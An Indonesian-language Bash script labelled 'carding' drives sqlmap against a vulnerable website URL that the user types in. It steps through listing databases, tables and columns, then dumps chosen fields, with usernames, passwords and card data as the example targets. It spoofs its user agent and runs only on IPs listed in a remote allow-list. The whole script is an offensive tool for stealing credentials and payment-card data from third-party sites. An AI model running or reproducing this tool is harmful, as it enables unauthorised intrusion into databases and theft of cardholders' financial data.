#!/bin/bash

if [[ $USER != "root" ]]; then
	echo "Maaf, Anda harus menjalankan ini sebagai root"
	exit
fi

# initialisasi var
export DEBIAN_FRONTEND=noninteractive
OS=`uname -m`;
MYIP=$(wget -qO- ipv4.icanhazip.com);
MYIP2="s/xxxxxxxxx/$MYIP/g";
ether=`ifconfig | cut -c 1-8 | sort | uniq -u | grep venet0 | grep -v venet0:`
if [[ $ether = "" ]]; then
        ether=eth0
fi

#vps="zvur";
vps="aneka";

#if [[ $vps = "zvur" ]]; then
	#source="http://"
#else
	source="https://raw.githubusercontent.com/elangoverdosis/deeniedoank"
#fi

# go to root
cd

# check registered ip
wget -q -O IPcarding $source/debian7/IPcarding.txt
if ! grep -w -q $MYIP IPcarding; then
	echo "Maaf, hanya IP yang terdaftar yang bisa menggunakan script ini!"
	if [[ $vps = "zvur" ]]; then
		echo "Hubungi: editor ( elang overdoasis atau deeniedoank)"
	else
		echo "Hubungi: editor ( elang overdoasis atau deeniedoank)"
	fi
	rm /root/IPcarding
	exit
fi

# carding
cd /root
cd sqlmap
clear
read -p "Masukkan Link atau Web Yang Error (VULN): " cardinger
clear
./sqlmap.py -u $cardinger --random-agent --dbs
                echo ""
		PS3='Silahkan pilih (1-2):'
options=("Lanjut" "Keluar (Jika GAGAL)")
select opt in "${options[@]}"
do
    case $opt in
        "Lanjut")
	break
	;;
	"Keluar (Jika GAGAL)")
	exit
	break
	;;
	 *) echo invalid option;
	esac
done
echo ""
read -p "Ketikkan Table Yang Akan Di Buka: " tabled
clear
./sqlmap.py -u $cardinger --random-agent -D $tabled --tables
echo ""
		PS3='Silahkan pilih (1-2):'
options=("Lanjut" "Keluar (Jika GAGAL)")
select opt in "${options[@]}"
do
    case $opt in
        "Lanjut")
	break
	;;
	"Keluar (Jika GAGAL)")
	exit
	break
	;;
	 *) echo invalid option;
	esac
done
read -p "Ketikkan Column Yang Akan Di Buka: " columed
clear
./sqlmap.py -u $cardinger --random-agent -D $tabled -T $columed --columns
echo ""
		PS3='Silahkan pilih (1-2):'
options=("Lanjut" "Keluar (Jika GAGAL)")
select opt in "${options[@]}"
do
    case $opt in
        "Lanjut")
	break
	;;
	"Keluar (Jika GAGAL)")
	exit
	break
	;;
	 *) echo invalid option;
	esac
done
echo "Contoh: UserName,UserPass,Card (Pisahkan Dengan Koma)"
read -p "Ketikkan Nama Data Yang Mau Di Ambil: " dataed
clear
./sqlmap.py -u $cardinger --random-agent -D $tabled -T $columed -C $dataed --dumps
echo "SEKIAN SEMOGA SUKSES BOSS!!!"
